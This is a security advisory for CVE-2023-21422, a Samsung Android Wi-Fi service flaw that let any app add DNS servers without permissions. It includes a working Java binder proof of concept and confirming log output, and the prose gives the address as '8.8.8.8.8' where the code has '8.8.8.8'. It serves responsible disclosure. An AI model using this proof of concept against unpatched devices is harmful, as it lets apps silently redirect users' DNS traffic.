# Details

<table>
    <tr>
        <td>Name</td>
        <td>Samsung Android Framework</td>
    </tr>
    <tr>
        <td>Library path</td>
        <td><code>/apex/com.android.wifi/service-wifi.jar</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.08.14</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2023.01.04</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Moderate</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-21422">CVE-2023-21422</a> (SVE-2022-1931)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$2250</td>
    </tr>
</table>

# Description

The system service `wifi` (`android.net.wifi.IWifiManager`) was created in AOSP, but was patched in the Samsung Android Framework. Samsung added additional functionality to work with Wi-Fi. The `emAddPublicDnsAddr()` method allowed to add arbitrary DNS servers to any third-party app installed on the same device, without any permissions.

**Proof of Concept**

Adds `8.8.8.8.8` to the DNS list:
```java
static final int TRANSACTION_semAddPublicDnsAddr = 138;

protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    try {
        IBinder binder = getService("wifi");

        Parcel parcel = Parcel.obtain();
        parcel.writeInterfaceToken(binder.getInterfaceDescriptor());
        parcel.writeString("8.8.8.8");

        Parcel reply = Parcel.obtain();
        binder.transact(TRANSACTION_semAddPublicDnsAddr, parcel, reply, 0);
        reply.readException();
    } catch (Throwable th) {
        throw new RuntimeException(th);
    }
}

private IBinder getService(String name) throws Throwable {
    return (IBinder) Class.forName("android.os.ServiceManager")
            .getDeclaredMethod("getServiceOrThrow", String.class)
            .invoke(null, name);
}
```

As a result, the app will print the following log:
```
08-14 00:28:33.276  1489  1840 D WifiClientModeImpl[wlan0]: Link configuration changed for netId: 0 old: {InterfaceName: wlan0 LinkAddresses: [ fe80::b081:3bff:fe64:9d09/64,192.168.1.134/24 ] DnsAddresses: [ /192.168.1.1 ] Domains: local MTU: 0 ServerAddress: /192.168.1.1 TcpBufferSizes: 524288,1048576,4194304,524288,1048576,4194304 Routes: [ fe80::/64 -> :: wlan0 mtu 0,192.168.1.0/24 -> 0.0.0.0 wlan0 mtu 0,0.0.0.0/0 -> 192.168.1.1 wlan0 mtu 0 ]} new: {InterfaceName: wlan0 LinkAddresses: [ fe80::b081:3bff:fe64:9d09/64,192.168.1.134/24 ] DnsAddresses: [ /192.168.1.1,/8.8.8.8 ] Domains: local MTU: 0 ServerAddress: /192.168.1.1 TcpBufferSizes: 524288,1048576,4194304,524288,1048576,4194304 Routes: [ fe80::/64 -> :: wlan0 mtu 0,192.168.1.0/24 -> 0.0.0.0 wlan0 mtu 0,0.0.0.0/0 -> 192.168.1.1 wlan0 mtu 0 ]}
08-14 00:28:33.276  1489  1840 D WifiClientModeImpl[wlan0]: Queuing broadcast=ACTION_LINK_CONFIGURATION_CHANGED
08-14 00:28:33.276  1489  1840 D WifiClientModeImpl[wlan0]: Sending broadcast=ACTION_LINK_CONFIGURATION_CHANGED
08-14 00:28:33.276  1489  1856 D ConnectivityService: Update of LinkProperties for [105 WIFI]; created=true; everConnected=true
08-14 00:28:33.277  1489  1856 D ConnectivityService: Setting DNS servers for network 105 to [/192.168.1.1, /8.8.8.8]
08-14 00:28:33.277  1489  1840 D WifiClientModeImpl[wlan0]: updateLinkProperties nid: 0 state: CONNECTED v4 v4r v4dns
08-14 00:28:33.277  1489  1840 D WifiClientModeImpl[wlan0]:  ConnectableState screen=on 0 0 v4 v4r v4dns
08-14 00:28:33.278  1489  1856 D DnsManager: sendDnsConfigurationForNetwork(105, [192.168.1.1, 8.8.8.8], [local], 1800, 25, 8, 64, 0, 0, , [192.168.1.1, 8.8.8.8])
```

## References

- [Oversecured Blog. Discovering vendor-specific vulnerabilities in Android](https://blog.oversecured.com/Discovering-vendor-specific-vulnerabilities-in-Android/)
